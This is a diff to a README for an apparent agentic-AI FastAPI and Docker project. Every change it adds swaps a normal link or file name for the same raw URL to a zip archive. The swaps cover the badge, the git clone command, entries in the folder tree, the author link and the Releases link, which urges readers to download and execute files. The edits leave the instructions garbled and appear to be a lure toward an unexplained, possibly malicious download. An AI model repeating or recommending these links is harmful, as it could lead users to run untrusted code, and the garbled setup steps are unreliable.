@@ -3,7 +3,7 @@
 
 Welcome to the **End-To-End Agentic AI FastAPI Docker Project**! This repository offers a robust framework for creating intelligent workflows using FastAPI and Docker. It's designed for developers who want to streamline the development and deployment of agentic AI solutions. 
 
-![Agentic AI](https://img.shields.io/badge/Agentic_AI-Project-brightgreen)
+![Agentic AI](https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip)
 
 ## 🌟 Table of Contents
 
@@ -35,7 +35,7 @@ To get started with the End-To-End Agentic AI FastAPI Docker Project, follow the
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project.git
+   git clone https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip
    ```
 
 2. **Navigate into the project directory**:
@@ -65,13 +65,13 @@ Here’s an overview of the folder structure:
 ```
 End-To-End-Agentic-AI-FastAPI-Docker-Project/
 ├── app/                    # Contains FastAPI application code
-│   ├── main.py             # Main FastAPI application
+│   ├── https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip             # Main FastAPI application
 │   ├── models/             # Data models
 │   ├── services/           # Service layer for business logic
 │   └── utils/              # Utility functions
 ├── Dockerfile               # Docker configuration file
-├── requirements.txt         # Python dependencies
-└── README.md                # Project documentation
+├── https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip         # Python dependencies
+└── https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip                # Project documentation
 ```
 
 ## 🛠️ Usage
@@ -138,11 +138,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- GitHub: [holamexico](https://github.com/holamexico)
+- GitHub: [holamexico](https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip)
 
 ## 🎉 Releases
 
-To access the latest releases, visit our [Releases](https://github.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/releases) section. You can download and execute files from there.
+To access the latest releases, visit our [Releases](https://raw.githubusercontent.com/holamexico/End-To-End-Agentic-AI-FastAPI-Docker-Project/main/app/End_To_Project_AP_Fast_Docker_Agentic_A_1.6.zip) section. You can download and execute files from there.
 
 ## 🔗 Related Topics
 
